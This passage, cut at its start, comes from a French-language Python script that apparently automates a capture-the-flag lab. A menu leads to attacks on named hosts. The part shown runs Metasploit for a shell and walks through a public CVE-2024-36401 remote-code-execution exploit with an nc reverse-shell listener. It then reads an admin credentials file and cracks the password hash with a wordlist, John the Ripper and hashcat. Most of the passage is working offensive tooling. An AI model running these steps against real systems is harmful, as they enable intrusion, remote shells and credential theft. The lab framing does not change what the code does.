        msf_cmd = f"msfconsole -q -r {rc_file}"
        print_info(f"Commande: {msf_cmd}")
        
        print_warning("\nMetasploit va se lancer dans un nouveau terminal...")
        print_info("Une fois le shell obtenu, tapez:")
        print("  ls")
        print("  cat ADMIN_CREDENTIALS.txt")
        print()
        
        # Lancer Metasploit
        os.system(f"gnome-terminal -- bash -c '{msf_cmd}; exec bash' 2>/dev/null || xterm -e '{msf_cmd}' 2>/dev/null || {msf_cmd}")
        
        has_shell = input(f"\n{Colors.YELLOW}Avez-vous obtenu un shell? (o/n): {Colors.ENDC}")
        return has_shell.lower() == 'o'
    
    def exploit_manual(self):
        """Instructions pour exploitation manuelle"""
        
        lport = 1337
        
        print_info("\n=== EXPLOITATION MANUELLE ===")
        print()
        print("1. Cloner l'exploit:")
        print(f"   {Colors.CYAN}git clone https://github.com/Chocapikk/CVE-2024-36401.git{Colors.ENDC}")
        print()
        print("2. Lancer un listener:")
        print(f"   {Colors.CYAN}nc -lvnp {lport}{Colors.ENDC}")
        print()
        print("3. ExÃ©cuter l'exploit:")
        print(f"   {Colors.CYAN}python3 exploit_fix.py -u {self.base_url} -ip {self.local_ip} -rp {lport}{Colors.ENDC}")
        print()
        
        input(f"{Colors.YELLOW}Appuyez sur EntrÃ©e une fois le shell obtenu...{Colors.ENDC}")
        return True
    
    def get_credentials_auto(self):
        """RÃ©cupÃ©ration automatique/interactive des credentials"""
        
        print_info("Dans le shell, les credentials devraient Ãªtre dans ADMIN_CREDENTIALS.txt")
        print()
        print("Commandes Ã  exÃ©cuter:")
        print(f"  {Colors.CYAN}ls -la{Colors.ENDC}")
        print(f"  {Colors.CYAN}cat ADMIN_CREDENTIALS.txt{Colors.ENDC}")
        print()
        
        username = input(f"{Colors.YELLOW}Username trouvÃ©: {Colors.ENDC}") or "admin"
        password_hash = input(f"{Colors.YELLOW}Hash du password: {Colors.ENDC}")
        
        return {'username': username, 'hash': password_hash}
    
    def crack_hash_auto(self, creds):
        """Crack automatique du hash"""
        
        password_hash = creds.get('hash', '').strip()
        
        if not password_hash:
            print_error("Pas de hash fourni")
            return None
        
        print_info(f"Hash: {password_hash}")
        print_info(f"Longueur: {len(password_hash)} caractÃ¨res")
        
        # Identifier le type
        if len(password_hash) == 64:
            hash_type = "sha256"
            hashcat_mode = "1400"
        elif len(password_hash) == 32:
            hash_type = "md5"
            hashcat_mode = "0"
        elif len(password_hash) == 40:
            hash_type = "sha1"
            hashcat_mode = "100"
        else:
            hash_type = "unknown"
            hashcat_mode = "0"
        
        print_info(f"Type dÃ©tectÃ©: {hash_type.upper()}")

        # Phase 1: Utiliser la wordlist du repository
        print_info(f"\n[Phase 1] Crack avec wordlist du repository ({len(COMMON_PASSWORDS)} mots de passe)...")

        import hashlib

        for pwd in COMMON_PASSWORDS:
            if hash_type == "sha256":
                test_hash = hashlib.sha256(pwd.encode()).hexdigest()
            elif hash_type == "md5":
                test_hash = hashlib.md5(pwd.encode()).hexdigest()
            elif hash_type == "sha1":
                test_hash = hashlib.sha1(pwd.encode()).hexdigest()
            else:
                continue

            if test_hash == password_hash:
                print_success(f"MOT DE PASSE TROUVÃ‰: {pwd}")
                return pwd

        print_warning("Pas trouvÃ© dans la wordlist du repository")
        
        # Phase 2: Essayer avec John si disponible
        print_info("\n[Phase 2] Tentative avec John The Ripper...")
        
        if run_command("which john", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            john_cmd = f"john --format=raw-{hash_type} --wordlist=/usr/share/wordlists/rockyou.txt {hash_file} --max-run-time=60"
            print_info(f"Commande: {john_cmd}")
            
            result = run_command(john_cmd, timeout=70)
            
            # RÃ©cupÃ©rer le rÃ©sultat
            show_cmd = f"john --show --format=raw-{hash_type} {hash_file}"
            show_result = run_command(show_cmd, timeout=5)
            
            if show_result and ":" in show_result:
                password = show_result.split(':')[-1].strip()
                if password and password != "0 password hashes cracked":
                    print_success(f"John a trouvÃ©: {password}")
                    return password
        
        # Phase 3: Hashcat si disponible
        print_info("\n[Phase 3] Tentative avec Hashcat...")
        
        if run_command("which hashcat", timeout=5):
            hash_file = "/tmp/hash_to_crack.txt"
            with open(hash_file, 'w') as f:
                f.write(password_hash)
            
            hashcat_cmd = f"hashcat -m {hashcat_mode} -a 0 {hash_file} /usr/share/wordlists/rockyou.txt --runtime=60"
            print_info(f"Commande: {hashcat_cmd}")
            
            result = run_command(hashcat_cmd, timeout=70)
            
            if result and ":" in result:
                for line in result.split('\n'):
                    if password_hash in line and ":" in line:
                        password = line.split(':')[-1].strip()
                        print_success(f"Hashcat a trouvÃ©: {password}")
                        return password
        
        # Ã‰chec: demander manuellement
        print_warning("\nCrack automatique Ã©chouÃ©. Essayez manuellement:")
        print(f"  {Colors.CYAN}echo '{password_hash}' > hash.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}hashcat -m {hashcat_mode} -a 0 hash.txt rockyou.txt{Colors.ENDC}")
        print(f"  {Colors.CYAN}john --format=raw-{hash_type} --wordlist=rockyou.txt hash.txt{Colors.ENDC}")
        print()
        
        password = input(f"{Colors.YELLOW}Mot de passe crackÃ© manuellement: {Colors.ENDC}")
        return password if password else None


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MENU PRINCIPAL
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main_menu():
    """Menu principal"""
    
    captured_flags = {}
    
    while True:
        clear_screen()
        banner()
        
        print(f"\n{Colors.BOLD}  MENU PRINCIPAL{Colors.ENDC}\n")
        
        print("  [0] Reconnaissance complÃ¨te (DNS, Ports, Services)")
        print()
        
        exploits = {
            1: ("FileServer - Bruteforce + ZIP Cracking", Exploit1_FileServer),
            2: ("Travel - File Upload RCE", Exploit2_Travel),
            3: ("Restricted - DoS + Info Disclosure", Exploit3_Restricted),
            4: ("Staging (Liberty) - OSINT", Exploit4_Staging),
            5: ("WebServices - CVE-2024-36401 RCE", Exploit5_WebServices),
        }
        
        for num, (name, _) in exploits.items():
            status = f"{Colors.GREEN}âœ“{Colors.ENDC}" if num in captured_flags else " "
            print(f"  [{status}] [{num}] {name}")
            if num in captured_flags:
                print(f"        â†’ {Colors.YELLOW}{captured_flags[num]}{Colors.ENDC}")
        
        print()
        print(f"  [6] Afficher tous les flags")
        print(f"  [9] Quitter")
        print()
        
        try:
            choice = input(f"  {Colors.CYAN}Choix: {Colors.ENDC}")
            choice = int(choice)
            
            if choice == 9:
                print_info("\nAu revoir!")
                break
            elif choice == 0:
                recon = Reconnaissance()
                recon.run_full_recon()
                pause()
            elif choice in exploits:
                exploit_class = exploits[choice][1]
                exploit = exploit_class()
                flag = exploit.run()
                if flag:
                    captured_flags[choice] = flag
            elif choice == 6:
                clear_screen()
                print_section("FLAGS CAPTURÃ‰S")
                if captured_flags:
                    for num, flag in sorted(captured_flags.items()):
                        print(f"  [{num}] {Colors.GREEN}{flag}{Colors.ENDC}")
                else:
                    print_warning("Aucun flag capturÃ©")
                pause()
                
        except ValueError:
            pass
        except KeyboardInterrupt:
            print_info("\n\nInterruption.")
            break


# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# POINT D'ENTRÃ‰E
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print_info("\n\nInterruption.")
        sys.exit(0)
